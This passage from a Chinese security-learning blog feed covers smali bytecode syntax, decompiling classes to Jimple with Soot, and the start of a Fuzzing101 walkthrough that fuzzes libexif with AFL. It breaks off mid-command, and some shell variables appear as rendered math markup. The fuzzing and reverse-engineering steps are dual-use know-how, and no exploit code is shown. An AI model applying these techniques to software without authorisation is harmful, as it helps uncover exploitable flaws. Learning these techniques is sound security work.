<tr>
<th>java 代码</th>
<th>smali 语法</th>
</tr>
</thead>
<tbody><tr>
<td>a += b;</td>
<td>add-int/2addr v0, v1</td>
</tr>
<tr>
<td>a -= b;</td>
<td>sub-int/2addr v0, v1</td>
</tr>
<tr>
<td>a *= b;</td>
<td>mul-int/2addr v0, v1</td>
</tr>
<tr>
<td>a /= b;</td>
<td>div-int/2addr v0, v1</td>
</tr>
<tr>
<td>a %= b;</td>
<td>rem-int/2addr v0, v1</td>
</tr>
<tr>
<td>a &amp;= b;</td>
<td>and-int/2addr v0, v1</td>
</tr>
<tr>
<td>a |= b;</td>
<td>or-int/2addr v0, v1</td>
</tr>
<tr>
<td>a ^= b;</td>
<td>xor-int/2addr v0, v1</td>
</tr>
<tr>
<td>a &lt;&lt;= b;</td>
<td>shl-int/2addr v0, v1</td>
</tr>
<tr>
<td>a &gt;&gt;= b;</td>
<td>shr-int/2addr v0, v1</td>
</tr>
<tr>
<td>a &gt;&gt;&gt;= b;</td>
<td>ushr-int/2addr v0, v1</td>
</tr>
</tbody></table>
<p>注意，如果是如 add-int/lit8 vx, vy, lit8 的指令，即是让 vy 加上 lit8，将结果保存到 vx。</p>
<h4 id="赋值"><a href="#赋值" class="headerlink" title="赋值"></a>赋值</h4><p>常量赋值：</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><code class="hljs smali">const                   v0, 0x7F030018  	<span class="hljs-comment"># R.layout.activity_challenge   #从R中取出静态值</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">const/4 </span>                v3, 0x2   			<span class="hljs-comment"># 4也可以换成16或者high16，表示取整数值</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">const-string </span>           v2, <span class="hljs-string">&quot;Challenge&quot;</span> 	<span class="hljs-comment"># 取字符串</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">const-class </span>            v2, Context    		<span class="hljs-comment"># 把类对象取出</span><br></code></pre></td></tr></table></figure>

<p>变量间赋值：</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><code class="hljs smali">move  			vx, vy   		           <span class="hljs-comment"># 将vy的值赋值给vx，也可以是move-object等</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">move-result </span>	vx  					   <span class="hljs-comment"># 将上个方法调用后的结果赋值给vx，也可以是move-result-object</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">return-object </span>	vx 						   <span class="hljs-comment"># 将vx的对象作为函数返回值</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">new-instance </span>   v0, ChallengePagerAdapter  <span class="hljs-comment"># 实例化一个对象存入v0中</span><br></code></pre></td></tr></table></figure>

<p>对象赋值：</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><code class="hljs smali">动态字段操作：<span class="hljs-built_in"></span><br><span class="hljs-built_in">iput-object </span>            a,(this),b   <span class="hljs-comment"># 将a的值给b，一般用于b的初始化</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">iget-object </span>            a,(this),b   <span class="hljs-comment"># 将b的值给a，一般用于获取b的地址，接着调用它</span><br><br>静态字段操作：<span class="hljs-built_in"></span><br><span class="hljs-built_in">sput</span><br><span class="hljs-built_in"></span>sget<br><br>并且-后面是可以跟其他的类型的如：wide、boolean、byte、char、short<br></code></pre></td></tr></table></figure>

<h4 id="函数操作"><a href="#函数操作" class="headerlink" title="函数操作"></a>函数操作</h4><figure class="highlight smali"><table><tr><td class="code"><pre><code class="hljs smali">1.private：invoke-direct<br>2.public|protected：<span class="hljs-built_in"> invoke-virtual</span><br><span class="hljs-built_in"></span>3.static：invoke-static<br>4.parent: <span class="hljs-built_in"> invoke-super</span><br><span class="hljs-built_in"></span>基本调用形式：invoke-xxx &#123;参数&#125;, 类;-&gt;函数(参数原型)<br>第一个参数是类的实例化对象<br>后续的参数则是调用的函数中的传递参数<br></code></pre></td></tr></table></figure>

<h4 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h4><p>都是单词的缩写： eq -&gt; equal，lt -&gt; less than， gt -&gt; grater than， z -&gt; zero </p>
<figure class="highlight smali"><table><tr><td class="code"><pre><code class="hljs smali">if-eq vA, vB,<span class="hljs-keyword"> :cond_X</span>   	如果vA等于vB则跳转到:cond_X<span class="hljs-built_in"></span><br><span class="hljs-built_in">if-ne </span>vA, vB,<span class="hljs-keyword"> :cond_X</span>   	如果vA不等于vB则跳转到:cond_X<span class="hljs-built_in"></span><br><span class="hljs-built_in">if-lt </span>vA, vB,<span class="hljs-keyword"> :cond_X</span>   	如果vA小于vB则跳转到:cond_X<span class="hljs-built_in"></span><br><span class="hljs-built_in">if-ge </span>vA, vB,<span class="hljs-keyword"> :cond_X</span>   	如果vA大于等于vB则跳转到:cond_X<span class="hljs-built_in"></span><br><span class="hljs-built_in">if-gt </span>vA, vB,<span class="hljs-keyword"> :cond_X</span>   	如果vA大于vB则跳转到:cond_X<span class="hljs-built_in"></span><br><span class="hljs-built_in">if-le </span>vA, vB,<span class="hljs-keyword"> :cond_X</span>   	如果vA小于等于vB则跳转到:cond_X<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">if-eqz </span>vA,<span class="hljs-keyword"> :cond_X</span>      	如果vA等于0则跳转到:cond_X<span class="hljs-built_in"></span><br><span class="hljs-built_in">if-nez </span>vA,<span class="hljs-keyword"> :cond_X</span>      	如果vA不等于0则跳转到:cond_X<span class="hljs-built_in"></span><br><span class="hljs-built_in">if-ltz </span>vA,<span class="hljs-keyword"> :cond_X</span>      	如果vA小于0则跳转到:cond_X<span class="hljs-built_in"></span><br><span class="hljs-built_in">if-gez </span>vA,<span class="hljs-keyword"> :cond_X</span>      	如果vA大于等于0则跳转到:cond_X<span class="hljs-built_in"></span><br><span class="hljs-built_in">if-gtz </span>vA,<span class="hljs-keyword"> :cond_X</span>      	如果vA大于0则跳转到:cond_X<span class="hljs-built_in"></span><br><span class="hljs-built_in">if-lez </span>vA,<span class="hljs-keyword"> :cond_X</span>      	如果vA小于等于0则跳转到:cond_X<br></code></pre></td></tr></table></figure>

<h4 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h4><figure class="highlight smali"><table><tr><td class="code"><pre><code class="hljs smali">public void encrypt(String str) &#123;<br>    String ans = <span class="hljs-string">&quot;&quot;</span>;<br>    for (int i = 0 ; i &lt; str.length(); i++)&#123;<br>        ans += str.charAt(i);<br>    &#125;<br>    Log.e(<span class="hljs-string">&quot;ans:&quot;</span>, ans);<br>&#125;<br>&lt;=对应smali=&gt;<br><br><span class="hljs-comment"># public void encrypt(String str) &#123;</span><br><span class="hljs-keyword">.method</span><span class="hljs-keyword"> public</span> encrypt(<span class="hljs-class">Ljava/lang/String;</span>)V <br><span class="hljs-keyword">.locals</span> 4 <br><span class="hljs-keyword">.param</span> p1, <span class="hljs-string">&quot;str&quot;</span>    <span class="hljs-comment"># Ljava/lang/String;</span><br><span class="hljs-keyword">.prologue</span> <br><br><span class="hljs-comment"># String ans = &quot;&quot;;</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">const-string </span>v0, <span class="hljs-string">&quot;&quot;</span> <br><span class="hljs-keyword">.local</span> v0, <span class="hljs-string">&quot;ans&quot;</span>:<span class="hljs-class">Ljava/lang/String;</span> <br><br><span class="hljs-comment"># for (int i  0 ; i &lt; str.length();i++)&#123;</span><br><span class="hljs-comment"># int i=0 =&gt;v1</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">const/4 </span>v1, 0x0<br><span class="hljs-keyword">.local</span> v1, <span class="hljs-string">&quot;i&quot;</span>:I<span class="hljs-keyword"></span><br><span class="hljs-keyword">:goto_0</span>				<span class="hljs-comment"># for_start_place</span><br><br><span class="hljs-comment"># str.length()=&gt;v2</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">invoke-virtual </span>&#123;p1&#125;, <span class="hljs-class">Ljava/lang/String;</span>-&gt;length()I<span class="hljs-built_in"></span><br><span class="hljs-built_in">move-result </span>v2 <br><br><span class="hljs-comment"># i&lt;str.length() </span><span class="hljs-built_in"></span><br><span class="hljs-built_in">if-ge </span>v1, v2,<span class="hljs-keyword"> :cond_0</span> <br><br><span class="hljs-comment"># ans += str.charAt(i); </span><br><span class="hljs-comment"># str.charAt(i) =&gt; v2</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">new-instance </span>v2, <span class="hljs-class">Ljava/lang/StringBuilder;</span> <span class="hljs-built_in"></span><br><span class="hljs-built_in">invoke-direct </span>&#123;v2&#125;, <span class="hljs-class">Ljava/lang/StringBuilder;</span>-&gt;&lt;init&gt;()V<br>invoke-virtual&#123;v2,v0&#125;,<span class="hljs-class">Ljava/lang/StringBuilder;</span>-&gt;append(<span class="hljs-class">Ljava/lang/String;</span>)<span class="hljs-class">Ljava/lang/StringBuilder;</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">move-result-object </span>v2 <br><br><span class="hljs-comment">#str.charAt(i) =&gt; v3</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">invoke-virtual </span>&#123;p1, v1&#125;, <span class="hljs-class">Ljava/lang/String;</span>-&gt;charAt(I)C <span class="hljs-built_in"></span><br><span class="hljs-built_in">move-result </span>v3<br><br><span class="hljs-comment"># ans += v3 =&gt;v0</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">invoke-virtual </span>&#123;v2, v3&#125;, <span class="hljs-class">Ljava/lang/StringBuilder;</span>-&gt;append(C)<span class="hljs-class">Ljava/lang/StringBuilder;</span> <span class="hljs-built_in"></span><br><span class="hljs-built_in">move-result-object </span>v2 <span class="hljs-built_in"></span><br><span class="hljs-built_in">invoke-virtual </span>&#123;v2&#125;, <span class="hljs-class">Ljava/lang/StringBuilder;</span>-&gt;toString()<span class="hljs-class">Ljava/lang/String;</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">move-result-object </span>v0<br><br><span class="hljs-comment"># i++</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">add-int/lit8 </span>v1, v1, 0x1<span class="hljs-built_in"></span><br><span class="hljs-built_in">goto </span>:goto_0<br><br><span class="hljs-comment"># Log.e(&quot;ans:&quot;,ans);</span><span class="hljs-keyword"></span><br><span class="hljs-keyword">:cond_0</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">const-string </span>v2, <span class="hljs-string">&quot;ans:&quot;</span> <span class="hljs-built_in"></span><br><span class="hljs-built_in">invoke-static </span>&#123;v2, v0&#125;, <span class="hljs-class">Landroid/util/Log;</span>-&gt;e(<span class="hljs-class">Ljava/lang/String;</span><span class="hljs-class">Ljava/lang/String;</span>)I<span class="hljs-built_in"></span><br><span class="hljs-built_in">return-void </span><span class="hljs-keyword"></span><br><span class="hljs-keyword">.end method</span><br></code></pre></td></tr></table></figure>

<h4 id="switch-语句"><a href="#switch-语句" class="headerlink" title="switch 语句"></a>switch 语句</h4><figure class="highlight smali"><table><tr><td class="code"><pre><code class="hljs smali">public void encrypt(int flag) &#123;<br>        String ans = null;<br>        switch (flag)&#123;<br>            case 0:<br>                ans = <span class="hljs-string">&quot;ans is 0&quot;</span>;<br>                break;<br>            default:<br>                ans = <span class="hljs-string">&quot;noans&quot;</span>;<br>                break;<br>        &#125;<br>        Log.v(<span class="hljs-string">&quot;ans:&quot;</span>,ans);<br>    &#125;<br>&lt;=对应smali=&gt;<br><span class="hljs-comment">#public void encrypt(int flag) &#123;</span><br><span class="hljs-keyword">.method</span><span class="hljs-keyword"> public</span> encrypt(I)V <br><span class="hljs-keyword">    .locals</span> 2<br><span class="hljs-keyword">    .param</span> p1, <span class="hljs-string">&quot;flag&quot;</span>    <span class="hljs-comment"># I</span><br><span class="hljs-keyword">    .prologue</span><br>    <br><span class="hljs-comment">#String ans = null;</span><br>   <span class="hljs-built_in"> const/4 </span>v0, 0x0<br><span class="hljs-keyword">    .local</span> v0, <span class="hljs-string">&quot;ans&quot;</span>:<span class="hljs-class">Ljava/lang/String;</span><br>    <br><span class="hljs-comment">#switch (flag)&#123;</span><br>   <span class="hljs-built_in"> packed-switch </span>p1,<span class="hljs-keyword"> :pswitch_data_0</span>	 <span class="hljs-comment"># pswitch_data_0指定case区域的开头及结尾</span><br>    <br><span class="hljs-comment">#default: ans=&quot;noans&quot;</span><br>   <span class="hljs-built_in"> const-string </span>v0, <span class="hljs-string">&quot;noans&quot;</span><br>    <br><span class="hljs-comment">#Log.v(&quot;ans:&quot;,ans)</span><br>   <span class="hljs-keyword"> :goto_0</span><br>   <span class="hljs-built_in"> const-string </span>v1, <span class="hljs-string">&quot;ans:&quot;</span><br>   <span class="hljs-built_in"> invoke-static </span>&#123;v1, v0&#125;, <span class="hljs-class">Landroid/util/Log;</span>-&gt;v(<span class="hljs-class">Ljava/lang/String;</span><span class="hljs-class">Ljava/lang/String;</span>)I<br>   <span class="hljs-built_in"> return-void</span><br><span class="hljs-built_in"></span>    <br><span class="hljs-comment">#case 0: ans=&quot;ans is 0&quot;</span><br>   <span class="hljs-keyword"> :pswitch_0</span>      <span class="hljs-comment">#pswitch_&lt;case的值&gt;</span><br>   <span class="hljs-built_in"> const-string </span>v0, <span class="hljs-string">&quot;ans is 0&quot;</span><br>   <span class="hljs-built_in"> goto </span>:goto_0  <span class="hljs-comment"># break</span><br>   <span class="hljs-built_in"> nop</span><br><span class="hljs-built_in"></span>   <span class="hljs-keyword"> :pswitch_data_0</span> <span class="hljs-comment">#case区域的结束</span><br><span class="hljs-keyword">    .packed</span>-switch 0x0   <span class="hljs-comment">#定义case的情况</span><br>       <span class="hljs-keyword"> :pswitch_0</span>   <span class="hljs-comment">#case 0</span><span class="hljs-keyword"></span><br><span class="hljs-keyword">    .end packed</span>-switch<span class="hljs-keyword"></span><br><span class="hljs-keyword">.end method</span><br></code></pre></td></tr></table></figure>

<p>其中case定义情况有两种：</p>
<ul>
<li>```smali<br>从0开始递增<br>packed-switch p1, :pswitch_data_0<br>…<br>:pswitch_data_0<br>.packed-switch 0x0<pre><code>:pswitch_0
:pswitch_1 
</code></pre>
<figure class="highlight smali"><table><tr><td class="code"><pre><code class="hljs smali"><br>- ```smali<br>  无规则switch<br> <span class="hljs-built_in"> sparse-switch </span>p1,:sswitch_data_0<br><span class="hljs-keyword">  .</span>..<br>  sswitch_data_0<br><span class="hljs-keyword">  .sparse</span>-switch<br>      0xa -&gt;<span class="hljs-keyword"> :</span> sswitch_0<br>      0xb -&gt;<span class="hljs-keyword"> :</span> sswitch_1 <span class="hljs-comment"># 字符会转化成数组</span><br></code></pre></td></tr></table></figure></li>
</ul>
<h4 id="try-catch-语句"><a href="#try-catch-语句" class="headerlink" title="try-catch 语句"></a>try-catch 语句</h4><figure class="highlight smali"><table><tr><td class="code"><pre><code class="hljs smali">public void encrypt(int flag) &#123;<br>    String ans = null;<br>    try &#123;<br>        ans = <span class="hljs-string">&quot;ok!&quot;</span>;<br>    &#125; catch (Exception e)&#123;<br>        ans = e.toString();<br>    &#125;<br>    Log.d(<span class="hljs-string">&quot;error&quot;</span>,ans);<br>&#125;<br>&lt;=对应smali=&gt;<br><span class="hljs-comment">#public void encrypt(int flag) &#123;</span><br><span class="hljs-keyword">.method</span><span class="hljs-keyword"> public</span> encrypt(I)V<br><span class="hljs-keyword">    .locals</span> 3<br><span class="hljs-keyword">    .param</span> p1, <span class="hljs-string">&quot;flag&quot;</span>    <span class="hljs-comment"># I</span><br><span class="hljs-keyword">    .prologue</span><br>    <br><span class="hljs-comment">#String ans = null;</span><br>   <span class="hljs-built_in"> const/4 </span>v0, 0x0<br><span class="hljs-keyword">    .line</span> 20<br><span class="hljs-keyword">    .local</span> v0, <span class="hljs-string">&quot;ans&quot;</span>:<span class="hljs-class">Ljava/lang/String;</span><br>    <br><span class="hljs-comment">#try &#123; ans=&quot;ok!&quot;; &#125;</span><br>   <span class="hljs-keyword"> :try_start_0</span>  <span class="hljs-comment"># 第一个try开始，</span><br>   <span class="hljs-built_in"> const-string </span>v0, <span class="hljs-string">&quot;ok!&quot;</span><br>   <span class="hljs-keyword"> :try_end_0</span>   <span class="hljs-comment"># 第一个try结束(主要是可能有多个try)</span><br><span class="hljs-keyword">    .catch</span> <span class="hljs-class">Ljava/lang/Exception;</span> &#123;:try_start_0 ..<span class="hljs-keyword"> :try_end_0</span>&#125;<span class="hljs-keyword"> :catch_0</span><br>    <br><span class="hljs-comment">#Log.d(&quot;error&quot;,ans);</span><br>   <span class="hljs-keyword"> :goto_0</span><br>   <span class="hljs-built_in"> const-string </span>v2, <span class="hljs-string">&quot;error&quot;</span><br>   <span class="hljs-built_in"> invoke-static </span>&#123;v2, v0&#125;, <span class="hljs-class">Landroid/util/Log;</span>-&gt;d(<span class="hljs-class">Ljava/lang/String;</span><span class="hljs-class">Ljava/lang/String;</span>)I<br>   <span class="hljs-built_in"> return-void</span><br><span class="hljs-built_in"></span>    <br><span class="hljs-comment">#catch (Exception e)&#123;ans = e.toString();&#125;</span><br>   <span class="hljs-keyword"> :catch_0</span> <span class="hljs-comment">#第一个catch</span><br>   <span class="hljs-built_in"> move-exception </span>v1<br><span class="hljs-keyword">    .local</span> v1, <span class="hljs-string">&quot;e&quot;</span>:<span class="hljs-class">Ljava/lang/Exception;</span><br>   <span class="hljs-built_in"> invoke-virtual </span>&#123;v1&#125;, <span class="hljs-class">Ljava/lang/Exception;</span>-&gt;toString()<span class="hljs-class">Ljava/lang/String;</span><br>   <span class="hljs-built_in"> move-result-object </span>v0<br>   <span class="hljs-built_in"> goto </span>:goto_0<span class="hljs-keyword"></span><br><span class="hljs-keyword">.end method</span><br></code></pre></td></tr></table></figure>

<h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><ul>
<li>array-length vA, vB        获取给定 vB 寄存器中数组的长度并赋给 vA 寄存器，数组长度指的是数组中的元素个数。</li>
<li>aget-object vx, vy, vz    获取对象引用数组的对象引用值到 vx 中。该数组由 vy 引用并由 vz 索引。</li>
<li>aput-object vx, vy, vz    将 vx 中的对象引用值放入对象引用数组的元素中。元素由 vz 索引，数组对象由 vy 引用。</li>
<li>aput vx,vy,vz   将 vx 中的整数值放入整数数组的一个元素中。元素由 vz 索引，数组对象由 vy 引用。</li>
<li>new-array vx, vy, type_id 生成一个 type_id 类型和 vy 元素大小的新数组，并将对该数组的引用放入 vx。</li>
</ul>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.anquanke.com/post/id/85035">https://www.anquanke.com/post/id/85035</a></p>
<p><a href="https://blog.csdn.net/u012184539/article/details/82720885">https://blog.csdn.net/u012184539/article/details/82720885</a></p>
<p><a href="https://ctf-wiki.org/android/basic_operating_mechanism/java_layer/smali/smali/">https://ctf-wiki.org/android/basic_operating_mechanism/java_layer/smali/smali/</a></p>
<h2 id="Lab2"><a href="#Lab2" class="headerlink" title="Lab2"></a>Lab2</h2><h3 id="Step1"><a href="#Step1" class="headerlink" title="Step1"></a>Step1</h3><p>导入 soot jar 包。</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230327140348837.png"><span class="image-caption">image-20230327140348837</span></p>
<p>编写代码运行即可反编译出jimple文件。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> soot.*;<br><span class="hljs-keyword">import</span> soot.options.Options;<br><span class="hljs-keyword">import</span> java.util.Collections;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        G.reset();<br>        Options.v().set_src_prec(Options.src_prec_class);<br>        Options.v().set_process_dir(Collections.singletonList(<span class="hljs-string">&quot;C:/Users/守城/Desktop/Step1/Lab_1&quot;</span>));<br>        Options.v().set_whole_program(<span class="hljs-keyword">true</span>);<br>        Options.v().set_allow_phantom_refs(<span class="hljs-keyword">true</span>);<br>        Options.v().set_prepend_classpath(<span class="hljs-keyword">true</span>);<br>        Options.v().set_output_format(Options.output_format_jimple);<br>        Scene.v().loadNecessaryClasses();<br><span class="hljs-comment">//        PackManager.v().runPacks();</span><br>        PackManager.v().writeOutput();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>放在同一目录下的sootOutput文件夹里。</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230327140529063.png"><span class="image-caption">image-20230327140529063</span></p>
<p>选一部分的jimple如下，在有smali的基础上再看这个是很简单，十分易懂。</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230327162355481.png"><span class="image-caption">image-20230327162355481</span></p>
<p>将jimple代码还原成java代码如下，感觉没有什么特别的地方。</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230327162335904.png"><span class="image-caption">image-20230327162335904</span></p>
]]></content>
  </entry>
  <entry>
    <title>Fuzzing101</title>
    <url>/2023/03/05/2023-03-05-Fuzzing101/</url>
    <content><![CDATA[<p>Fuzzing01 项目地址 ：<a href="https://github.com/antonio-morales/Fuzzing101">https://github.com/antonio-morales/Fuzzing101</a></p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>通过该项目学习如何使用 fuzz 以及如何在真实环境中使用 fuzz。</p>
<h3 id="Exercise-2"><a href="#Exercise-2" class="headerlink" title="Exercise 2"></a>Exercise 2</h3><p>由于是跟着 sakura 的课进行学习，而视频是从 Exercise 2 开始的，因此先做这个。</p>
<p>这是一个第三方库 libexif 的 fuzz，按照以下的六个步骤来完成 Fuzz：</p>
<ul>
<li>寻找到一个使用 libexif 库的应用程序。</li>
<li>创建出 exif 样本的种子语料库。</li>
<li>使用 AFL 或者 AFL++ 的编译器对 libexif 进行编译。</li>
<li>使用语料库种子作为输入对使用 exif 库的应用程序进行 Fuzz。</li>
<li>直到产生出一些 crashes。</li>
<li>对 crashes 进行分类，看看其是否能构成漏洞，并构建出相应的 PoC。</li>
</ul>
<p>在 make afl-clang-fast 的时候，这几行代码需要删去才行。然后再执行<code>make AFL_TRACE_PC=1</code>。</p>
<p><img src="/2023/03/05/2023-03-05-Fuzzing101/image-20230321200219840.png"><span class="image-caption">image-20230321200219840</span></p>
<p>接下来就跟着项目一步步开始吧。先拉取 libexif-0.6.14，将其进行构建并安装</p>
<p><img src="/2023/03/05/2023-03-05-Fuzzing101/image-20230305165949852.png"><span class="image-caption">image-20230305165949852</span></p>
<p>然后我们注意到接下来的是执行一个 configure 文件，是一个 sh 文件，注释标明其是用来创建 Makefile 文件的。使用 <svg xmlns:xlink="http://www.w3.org/1999/xlink" width="7.866ex" height="3.343ex" style="vertical-align: -1.171ex;" viewbox="0 -934.9 3386.7 1439.2" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">CC 以及 </title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-43" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"/>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-43" x="0" y="0"/>
 <use xlink:href="#E1-MJMATHI-43" x="760" y="0"/>
<g transform="translate(1521,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">以</text>
</g>
<g transform="translate(2453,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">及</text>
</g>
</g>
</svg>CXX 来指明编译器路径。</p>
<p><img src="/2023/03/05/2023-03-05-Fuzzing101/image-20230305170525008.png"><span class="image-caption">image-20230305170525008</span></p>
<p>所以我们可以直接指定 <svg xmlns:xlink="http://www.w3.org/1999/xlink" width="7.866ex" height="3.343ex" style="vertical-align: -1.171ex;" viewbox="0 -934.9 3386.7 1439.2" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">CC 以及 </title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-43" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"/>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-43" x="0" y="0"/>
 <use xlink:href="#E1-MJMATHI-43" x="760" y="0"/>
<g transform="translate(1521,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">以</text>
</g>
<g transform="translate(2453,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">及</text>
</g>
</g>
</svg>CXX 指向的路径是 afl-clang-fast 以及 afl-clang-fast++。</p>
<p><img src="/2023/03/05/2023-03-05-Fuzzing101/image-20230320213052791.png"><span class="image-caption">image-20230320213052791</span></p>
<p>然后再执行 configure 文件，创建出 Makefile 文件，但是其用的编译器已被替换：</p>
<p><img src="/2023/03/05/2023-03-05-Fuzzing101/image-20230305173301865.png"><span class="image-caption">image-20230305173301865</span></p>
<p>检查文件是否已成功被插桩。</p>
<p><img src="/2023/03/05/2023-03-05-Fuzzing101/image-20230320214212528.png"><span class="image-caption">image-20230320214212528</span></p>
<p>因为要 fuzz 的是第三方库，本身是不可执行的文件，存在问题的可能是他的 API 内部实现有漏洞，所以我们需要一个使用了这个第三方库的应用程序来进行 fuzz，因为之前已经把 afl-clang-fast 导入到环境变量里了，所以这边直接进行编译即可插桩。</p>
<p><img src="/2023/03/05/2023-03-05-Fuzzing101/image-20230320220937736.png"><span class="image-caption">image-20230320220937736</span></p>
<p>然后如果是正常进行 fuzz，是需要自己去寻找语料种子的，种子的寻找有以下几种方案：</p>
<ul>
<li>github 上进行寻找或者 google 搜索。</li>
<li>使用其他类似功能的程序的语料</li>
<li>使用生成器生成（感觉可以考虑 chatGPT）</li>
<li>语料蒸馏：使用 AFL 自带的 tmin 和 cmin。</li>
</ul>
<p>因为是第一次的学习使用，所以直接使用 fuzzing101 提供的种子进行学习。</p>
<p><img src="/2023/03/05/2023-03-05-Fuzzing101/image-20230320222126851.png"><span class="image-caption">image-20230320222126851</span></p>
<p>到这里一切都准备就绪了，可以开始把 AFL 跑起来了</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh">sudo /home/shoucheng/fuzz/AFL/afl-fuzz -i <svg xmlns:xlink="http://www.w3.org/1999/xlink" width="60.928ex" height="2.843ex" style="vertical-align: -0.838ex;" viewbox="0 -863.1 26232.9 1223.9" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">HOME/fuzzing_libexif/exif-samples-master/jpg/ -o </title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-48" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 219 683Q260 681 355 681Q389 681 418 681T463 682T483 682Q499 682 499 672Q499 670 497 658Q492 641 487 638H485Q483 638 480 638T473 638T464 637T455 637Q416 636 405 634T387 623Q384 619 355 500Q348 474 340 442T328 395L324 380Q324 378 469 378H614L615 381Q615 384 646 504Q674 619 674 627T617 637Q594 637 587 639T580 648Q580 650 582 660Q586 677 588 679T604 682Q609 682 646 681T740 680Q802 680 835 681T871 682Q888 682 888 672Q888 645 876 638H874Q872 638 869 638T862 638T853 637T844 637Q805 636 794 634T776 623Q773 618 704 340T634 58Q634 51 638 51Q646 48 692 46H723Q729 38 729 37T726 19Q722 6 716 0H701Q664 2 567 2Q533 2 504 2T458 2T437 1Q420 1 420 10Q420 15 423 24Q428 43 433 45Q437 46 448 46H454Q481 46 514 49Q520 50 522 50T528 55T534 64T540 82T547 110T558 153Q565 181 569 198Q602 330 602 331T457 332H312L279 197Q245 63 245 58Q245 51 253 49T303 46H334Q340 38 340 37T337 19Q333 6 327 0H312Q275 2 178 2Q144 2 115 2T69 2T48 1Q31 1 31 10Q31 12 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"/>
<path stroke-width="1" id="E1-MJMATHI-4F" d="M740 435Q740 320 676 213T511 42T304 -22Q207 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435ZM637 476Q637 565 591 615T476 665Q396 665 322 605Q242 542 200 428T157 216Q157 126 200 73T314 19Q404 19 485 98T608 313Q637 408 637 476Z"/>
